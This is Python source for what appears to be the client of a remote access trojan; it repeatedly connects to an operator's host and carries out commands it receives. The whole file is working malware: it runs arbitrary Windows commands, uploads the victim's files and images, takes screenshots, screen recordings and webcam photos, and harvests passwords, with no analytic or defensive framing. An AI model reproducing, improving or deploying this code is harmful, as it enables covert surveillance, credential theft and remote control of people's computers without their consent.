
import threading
from virusFunctions import *
import socket
import subprocess

while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Host,Port = get_host()
        client.connect((Host,Port))
        client.sendall('Yes! Master ready to Serve'.encode())


        while True:
            inp = client.recv(1024*128).decode()
            try:
                if 'cd' in inp:
                    '''Change directory'''
                    cmd = inp.split(',')
                    cd(cmd[1])
                    client.sendall('done'.encode())

                if inp == 'cwd':
                    ''' Get current Working Directory '''
                    client.sendall(cwd().encode())

                if 'upload' in inp and 'upload_s' not in inp:
                    'upload specified number of images from ls imgs list'
                    num = inp.split(' ')
                    send_images(int(num[-1]))
                    client.sendall('done'.encode())

                if 'msg' in inp:
                    ''' Display msg to Screen'''
                    msg = inp.split(',')
                    show_Msg(msg[-1])
                    client.sendall('done'.encode())

                if 'upload_s' in inp:
                    ''' Upload Specific files'''
                    files = inp.split(',')
                    upload_s(files[1:])
                    client.sendall('done'.encode())

                if 'screenrecord'  in inp:
                    ''' Screen record upto specified amount of time'''
                    t = int(inp.split(' ')[-1])*20
                    client.sendall('Recording Started'.encode())
                    threading.Thread(target=screen_record,args=(t,client)).start()

                if inp == 'ls imgs':
                    ''' Lists All images in the folder'''
                    client.sendall(f' {ls_imgs()} {len(ls_imgs())}'.encode())

                if inp == 'systeminfo':
                    ''' Computer Info'''
                    out,err = subprocess.Popen( 'systeminfo', stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,shell=True).communicate()
                    client.sendall(out)

                if inp == 'pswds':
                	'''in BETA'''
                    pswd()
                    client.sendall('password.txt uploded'.encode())


                if inp == 'ls':
                    ''' list all files and directories'''
                    client.send(f'{list_files()}'.encode())
                if inp == 'capture':
                    cap_img()
                    client.sendall('camera capture uploaded'.encode())

                if inp == 'screenshot':
                    ''' Screenshot the current display'''
                    screenshot()
                    client.sendall('screenshot uploaded'.encode())

                if 'cmd' in inp:
                    ''' Execute Windows commands'''
                    cmd = inp.split(',')
                    out = exe(cmd[-1])

                    if out:
                        client.sendall(out)
                    else:
                        client.sendall('executed'.encode())
                if 'speak' in inp:
                    '''Reads the text you sent using googleTTS'''
                    txt = inp.split('<')
                    speak(txt[1])
                    os.remove('welcome.mp3')
                    client.sendall('Played the sound'.encode())

                if inp == 'shutdown':
                    ''' Turns off the Pc'''
                    shutdown()

                if inp == 'wallpaper':
                    '''Changes the wallpaper'''
                    c_wallpaper()
                    os.remove('wallpaper.jpg')
                    client.sendall('Wallpaper changed'.encode())

                else:
                    client.send(b'<end>')
            except Exception as e:
                client.sendall(str(e).encode())

    except Exception as e :
        print(e)